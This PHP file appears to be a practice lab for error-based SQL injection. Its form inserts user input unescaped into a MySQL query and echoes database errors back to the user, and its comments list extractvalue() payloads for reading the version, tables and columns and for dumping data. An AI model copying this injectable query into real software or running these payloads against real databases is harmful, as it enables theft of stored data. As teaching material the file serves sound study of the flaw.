<?php
include('config.php');
include('waf.php');

// GET VERSION 
// 'and extractvalue(0,concat(0x3a, verion())),'

// GET TABLES
// 'and extractvalue(0,concat(0x3a, (select table_name from information_schema.tables where table_schema=database() limit 0,1))),'

// GET COLUMNS
// 'and extractvalue(0,concat(0x3a, (select column_name from information_schema.columns where table_name='gath39' limit 0,1))),'

// DUMP DATA
// (select first_name from billing_addresses limit 0,1)

// TEXT TUTORIAL
// https://www.facebook.com/notes/verry-darmawan/error-based/2305245552873650/

?>

<html>
<center>
	<h1> INPUT DATA </h1>
	<form method="POST">
		<table>
			<tr><td>Title</td><td>: <input type="text" name="title"></td></tr>
			<tr><td>Image Link</td><td>: <input type="text" name="image"></td></tr>
			<tr><td>Quote</td><td>: <textarea cols="50" rows="10" name="quote"></textarea></td></tr>
			<tr><td></td><td><input type="submit" name="submit" value="INPUT"></td></tr>
		</table>
	</form>
</html>

<?php

if(isset($_POST['submit'])){
	$title = $_POST['title'];
	$image = $_POST['image'];
	$quote = $_POST['quote'];
	
    $query = "INSERT INTO gath39.article VALUES ('', '$title', '$image', '$quote')";
    $result = mysqli_query($con,$query);
        
    if($result){
        echo "[!] Sukses Terinput";
     }else{
        echo mysqli_error($con);
    }       
}


?>
